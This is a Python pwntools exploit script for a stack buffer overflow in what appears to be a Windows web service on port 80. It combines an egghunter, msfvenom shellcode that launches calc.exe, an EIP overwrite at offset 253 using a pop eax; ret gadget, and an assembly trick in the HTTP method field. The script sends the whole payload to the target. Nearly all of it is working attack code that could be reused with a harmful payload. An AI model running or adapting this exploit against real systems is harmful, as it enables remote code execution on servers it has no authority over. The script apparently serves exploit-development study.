#!/usr/bin/python3
from pwn import remote, p32, asm

# !py mona egghunter -wow64
egg = b"w00t" * 2

egghunter  = b""
egghunter += b"\x31\xd2\x66\x81\xca\xff\x0f\x31\xdb\x42"
egghunter += b"\x53\x53\x52\x53\x53\x53\x6a\x29\x58\xb3"
egghunter += b"\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4"
egghunter += b"\x08\x3c\x05\x74\xdf\xb8\x77\x30\x30\x74"
egghunter += b"\x89\xd7\xaf\x75\xda\xaf\x75\xd7\xff\xe7"

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00\x0a\x0d\x25'
shellcode =  b""
shellcode += b"\xb8\xad\xfe\x2d\xab\xd9\xee\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x31\x31\x46\x13\x03\x46\x13"
shellcode += b"\x83\xee\x51\x1c\xd8\x57\x41\x63\x23\xa8\x91"
shellcode += b"\x04\xad\x4d\xa0\x04\xc9\x06\x92\xb4\x99\x4b"
shellcode += b"\x1e\x3e\xcf\x7f\x95\x32\xd8\x70\x1e\xf8\x3e"
shellcode += b"\xbe\x9f\x51\x02\xa1\x23\xa8\x57\x01\x1a\x63"
shellcode += b"\xaa\x40\x5b\x9e\x47\x10\x34\xd4\xfa\x85\x31"
shellcode += b"\xa0\xc6\x2e\x09\x24\x4f\xd2\xd9\x47\x7e\x45"
shellcode += b"\x52\x1e\xa0\x67\xb7\x2a\xe9\x7f\xd4\x17\xa3"
shellcode += b"\xf4\x2e\xe3\x32\xdd\x7f\x0c\x98\x20\xb0\xff"
shellcode += b"\xe0\x65\x76\xe0\x96\x9f\x85\x9d\xa0\x5b\xf4"
shellcode += b"\x79\x24\x78\x5e\x09\x9e\xa4\x5f\xde\x79\x2e"
shellcode += b"\x53\xab\x0e\x68\x77\x2a\xc2\x02\x83\xa7\xe5"
shellcode += b"\xc4\x02\xf3\xc1\xc0\x4f\xa7\x68\x50\x35\x06"
shellcode += b"\x94\x82\x96\xf7\x30\xc8\x3a\xe3\x48\x93\x50"
shellcode += b"\xf2\xdf\xa9\x16\xf4\xdf\xb1\x06\x9d\xee\x3a"
shellcode += b"\xc9\xda\xee\xe8\xae\x15\xa5\xb1\x86\xbd\x60"
shellcode += b"\x20\x9b\xa3\x92\x9e\xdf\xdd\x10\x2b\x9f\x19"
shellcode += b"\x08\x5e\x9a\x66\x8e\xb2\xd6\xf7\x7b\xb5\x45"
shellcode += b"\xf7\xa9\xd6\x08\x6b\x31\x37\xaf\x0b\xd0\x47"

# !py mona pattern_offset eip
offset = 253
junk = b"A" * (offset - len(egghunter))

payload  = b""
payload += egghunter
payload += junk
payload += p32(0x00418674) # pop eax; ret;

method  = b""
method += asm("xor eax, eax") # zf = 1
method += asm("jng $+0x17")   # if zf == 1 || sf != of

content  = b""
content += method + b" /" + payload + b"\r\n\r\n"
content += egg + shellcode

shell = remote("Windows", 80)
shell.sendline(content)
